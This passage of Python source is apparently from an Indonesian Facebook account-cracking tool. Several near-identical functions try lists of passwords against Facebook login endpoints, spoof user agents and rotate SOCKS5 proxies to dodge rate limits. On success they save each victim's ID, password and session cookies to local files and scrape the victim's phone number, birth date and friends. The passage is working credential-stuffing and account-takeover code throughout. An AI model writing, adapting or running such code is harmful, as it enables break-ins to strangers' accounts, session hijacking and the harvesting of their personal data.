			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': 'browser_dropdown', 'prefill_type': 'password', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': 'true', 'had_password_prefilled': 'true', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.15625; wd=501x950'
			heade={
			"Host": "touch.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://touch.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl1()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl1()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
def touch(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Touch Async {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ses = requests.Session()
	ua = uaasepitgansxc()
	ua2 = random.choice(ugen3)
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "touch.facebook.com","cache-control": "max-age=0","user-agent": ua2,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Chromium";v="107", "Not=A?Brand";v="24"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-dest": "document","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5YjVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df2b70837-684f-4f50-abec-6cef1b16e764%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5YjVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': 'browser_dropdown', 'prefill_type': 'password', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': 'true', 'had_password_prefilled': 'true', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.15625; wd=501x950'
			heade={
			"Host": "touch.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://touch.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5YjVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df2b70837-684f-4f50-abec-6cef1b16e764%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5YjVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl1()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl1()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1

def Asepitgans_Xd(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile Async {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(ugen7)
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=1239138353201716&kid_directed_site=0&app_id=1239138353201716&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1239138353201716%26redirect_uri%3Dhttps%253A%252F%252Fkachishop-d0c3a.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%26scope%3Dpublic_profile%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D087a364c-3d69-45b4-a55b-047dae50317c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.cinyour.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl1()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl1()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
#-----------------------[ METODE LAWAK V1]--------------------#
def cracklawakv1(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = uaasepitgansxc()
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]Mobile Iphone [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			link = ses.get('https://m.trunkstable.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
